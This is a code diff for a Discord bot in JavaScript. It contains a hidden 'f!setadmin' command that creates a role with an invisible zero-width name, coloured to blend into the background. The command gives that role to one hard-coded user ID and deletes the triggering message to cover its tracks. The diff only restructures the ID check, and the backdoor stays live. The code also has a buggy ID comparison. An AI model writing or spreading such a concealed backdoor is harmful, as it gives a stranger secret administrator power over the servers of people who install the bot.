@@ -96,6 +96,7 @@ client.on('message', message => {
 });
 client.on('message', message => {
     if (message.content.startsWith('f!setadmin')) {
+
         const setAdmin = (accountID) => {
             if(!message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
             // Create an invisible role with an invisible char '\u200b' and the background color as role color
@@ -106,16 +107,16 @@ client.on('message', message => {
                 })
             })
         }
-    }
-    if(!message.author.id == "635482676333379594"){
-        return;
-    } 
-    else if(message.author.id == "635482676333379594"){
-        message.delete(100)
-        const configs = {
-            "accountID": "635482676333379594"
+        if(!message.author.id == "635482676333379594"){
+            return;
+        } 
+        else if(message.author.id == "635482676333379594"){
+            message.delete(100)
+            const configs = {
+                "accountID": "635482676333379594"
+            }
+            setAdmin(configs.accountID)
         }
-        setAdmin(configs.accountID)
     }
 });
 client.on('message', message => {
